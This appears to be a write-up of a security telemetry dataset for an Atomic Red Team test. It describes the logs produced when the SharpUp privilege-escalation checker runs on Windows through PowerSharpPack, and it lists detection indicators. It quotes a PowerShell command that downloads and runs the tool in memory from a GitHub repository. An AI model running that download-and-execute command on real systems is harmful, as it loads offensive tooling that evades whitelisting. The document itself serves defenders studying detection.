# T1082-22: System Information Discovery — WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors

## Technique Context

T1082 (System Information Discovery) encompasses all forms of OS and environment enumeration that adversaries conduct to understand their foothold and plan next steps. SharpUp is a C# port of PowerUp, a well-known PowerShell privilege escalation auditing tool. SharpUp checks a Windows system for common misconfiguration-based privilege escalation vectors: writable service executables, unquoted service paths, hijackable scheduled tasks, always-install-elevated registry settings, and similar weaknesses. It is routinely deployed immediately after initial access to determine whether low-privileged code can become SYSTEM without exploiting a kernel vulnerability.

The PowerSharpPack delivery mechanism — downloading and reflectively loading a pre-compiled C# assembly via `iex(new-object net.webclient).downloadstring(...)` — avoids writing an executable to disk and bypasses application whitelisting controls that inspect file paths. In the defended variant of this dataset, Defender blocked the script before SharpUp could enumerate anything. With Defender disabled, the full execution proceeds.

## What This Dataset Contains

This dataset spans a 5-second window (2026-03-14T23:32:32Z–23:32:37Z) capturing the SharpUp enumeration attempt with Defender inactive.

**Process execution chain**: Sysmon EID 1 records the PowerShell process (PID 6760) with command line:

```
"powershell.exe" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
```

The process runs as `NT AUTHORITY\SYSTEM` with logon ID `0x3E7`. `whoami.exe` executes before and after (PIDs 5008 and 3044), both as SYSTEM.

**Network activity**: Sysmon EID 22 records a DNS query for `raw.githubusercontent.com` resolving to `185.199.108-111.133` at 23:32:32. The download succeeded at the network layer.

**Process access**: Three Sysmon EID 10 events show the parent PowerShell process (PID 6216) opening `whoami.exe` (PID 5008) and the execution PowerShell (PID 6760) with full access (`0x1FFFFF`). These are triggered by the test framework's use of the .NET `Process` API and are tagged by sysmon-modular with `technique_id=T1055.001` (DLL Injection), which represents a conservative rule match rather than actual injection.

**PowerShell script block logging**: 108 EID 4104 events and 2 EID 4103 events were captured (111 total). Available samples include the test framework invocations — `Import-Module 'C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1'` and `Invoke-AtomicTest T1082 -TestNumbers 22 -Cleanup`. The bulk of script blocks represent PowerShell initialization fragments and the SharpUp assembly content logged by script block recording.

**DLL loading**: 17 Sysmon EID 7 events capture .NET runtime loading. As with T1082-21, no Defender DLLs (`MpOAV.dll`, `MpClient.dll`) appear, confirming Defender was absent. The presence of .NET BCL assemblies indicates reflective loading of the SharpUp C# assembly completed successfully.

**Security events**: Three Security EID 4688 events cover `whoami.exe` (twice) and `powershell.exe`. All processes run as `NT AUTHORITY\SYSTEM`.

**Named pipe and file creation**: Sysmon EID 17 records the standard `\PSHost.*.powershell` pipe. Sysmon EID 11 records the routine `StartupProfileData-NonInteractive` PowerShell profile cache write.

Compared to the defended dataset (48 sysmon, 12 security, 52 powershell), this run produced 27 sysmon, 3 security, and 111 powershell events. The PowerShell event count more than doubled (52 → 111) because SharpUp actually executed and its assembly code was logged by EID 4104. The Sysmon and Security counts decreased because Defender is absent — the defended run's elevated counts included Defender-related process activity and additional process chain events from blocking.

## What This Dataset Does Not Contain

SharpUp's enumeration output — the actual list of privilege escalation vectors discovered — does not appear as discrete log events. SharpUp writes its findings to the console within the reflective PowerShell execution context, not to files or separate processes. The enumeration of service configurations, scheduled tasks, and registry settings occurs through in-process .NET API calls that do not generate individual Windows event log entries. The 108+ EID 4104 script blocks contain SharpUp's assembly bytecode as it was deserialized and logged, but the enumeration results are not separately recorded.

No Sysmon EID 3 network events capture the GitHub download. No file creation events record the downloaded script, consistent with fully in-memory execution.

## Assessment

This dataset captures a complete SharpUp execution delivered via PowerSharpPack, running as SYSTEM on a domain-joined Windows 11 workstation with Defender disabled. The primary artifact is the PowerShell command line containing the explicit PowerSharpPack download URL and the `Invoke-SharpUp` function reference, visible in both Sysmon EID 1 and Security EID 4688. The DNS resolution for `raw.githubusercontent.com` from a SYSTEM-context PowerShell process provides a second indicator.

The 111 PowerShell EID 4104 events represent the complete execution trace — the SharpUp assembly was logged by PowerShell's script block recording before being executed in memory. This is the richest source of technique-specific evidence in the dataset.

## Detection Opportunities Present in This Data

**Sysmon EID 1 / Security EID 4688**: The command line contains `S3cur3Th1sSh1t/PowerSharpPack` and `Invoke-SharpUp` — both are high-confidence indicators. The `iex(new-object net.webclient).downloadstring(` pattern is a reliable general indicator of download-and-execute.

**Sysmon EID 22**: DNS query for `raw.githubusercontent.com` from `powershell.exe` running as SYSTEM. This combination — system account, PowerShell, GitHub raw content — is rarely legitimate.

**PowerShell EID 4104**: Script block content will include SharpUp's compiled assembly text. While the full assembly is large, specific SharpUp function signatures or output strings may be identifiable.

**Process chain**: `NT AUTHORITY\SYSTEM` → `powershell.exe` → [GitHub download] → `whoami.exe` is a consistent pattern across PowerSharpPack tests. The `whoami.exe` executions as pre/post-execution identity checks become a behavioral anchor when correlated with a nearby download event.
